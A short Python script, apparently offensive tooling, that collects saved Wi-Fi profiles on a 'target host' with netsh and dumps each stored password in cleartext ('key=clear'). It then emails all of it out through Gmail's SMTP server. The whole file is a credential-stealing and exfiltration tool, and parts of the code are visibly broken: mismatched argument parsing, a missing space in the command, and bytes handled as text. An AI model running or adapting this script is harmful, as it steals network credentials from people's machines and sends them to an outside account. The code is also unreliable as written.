#! /usr/bin/env/python3
#! /usr/bin/python
"""A simple script used to extract wifi settings from a target host.
   Uses Python 3.8"""

import subprocess
import argparse
import smtplib
import re


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = argparse.ArgumentParser()
    # arguments
    parser.add_argument('-e', '--email', dest='email', help='Email address to send data to')
    parser.add_argument('-p', '--password', dest='password', help='Email password')

    (options, arguments) = parser.parse_args()

    return options


def send_mail(email, password, message):
    """Sends email with """
    server = smtplib.SMTP('smtp.gmail.com', 587)                # gmail smtp server address and port
    server.starttls()
    server.login(email, password)                               # logs into email account
    server.sendmail(email, email, message)                      # sends email from 'email' account to 'email' account
    server.quit()


options = get_arguments()

command = 'netsh wlan show profile'                                     # shows wifi profile
networks = subprocess.check_output(command, shell=True)                 # executes command
network_names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)      # regex to search for network SSIDs

result = ''

for network_name in network_names_list:
    """Extracts information for each network in list"""
    command = 'netsh wlan show profile' + network_name + ' key=clear'   # sets command
    current_result = subprocess.check_output(command, shell=True)       # executes command
    result += current_result


send_mail(options.email, options.password, result)
